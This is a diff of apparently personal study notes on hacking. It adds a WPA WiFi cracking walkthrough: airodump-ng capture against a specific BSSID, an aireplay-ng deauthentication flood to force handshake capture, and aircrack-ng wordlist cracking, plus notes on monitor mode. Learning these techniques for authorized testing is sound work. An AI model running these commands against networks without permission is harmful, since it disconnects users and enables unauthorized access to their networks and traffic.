@@ -34,7 +34,7 @@ facebookcorewwwi.onion
 
 ##################################################
 privacy and data theft
-
+-
 ##################################################
 
 the actual stuff starts at 1139
@@ -133,6 +133,42 @@ limitation on channels in particular country
 
 psk:preshared key
 
+PBKDF2 is used for wpsk for 4096 times
 
+use bsid
 
+sudo airodump-ng --bssid '' -c 'channel no' -w 'filename' wlan0
 
+sudo airodump-ng --bssid  08:25:25:2A:61:5F -c 13 -w file wlan0
+
+-c channel
+-w writing a file
+#we are hacking block of data to find the password
+#not just password but the whole data which has been transfered
+
+pastel monitoring
+
+deauthorizing:
+when reconnecting it takes the wpa handshake
+
+aireplay-ng --deauth 0 -a 'BSID' wlp6s0mon
+
+rainbow tables
+
+cracking:
+
+aircrack-ng -w listA Soham01.cap
+
+##################################################
+
+talking about passwords
+
+red teaming and blue teaming
+
+wifi doesnt works after monitor mode
+airmon-ng stop wlps0mon
+
+and then restart network service
+
+##################################################
+Setting up environment
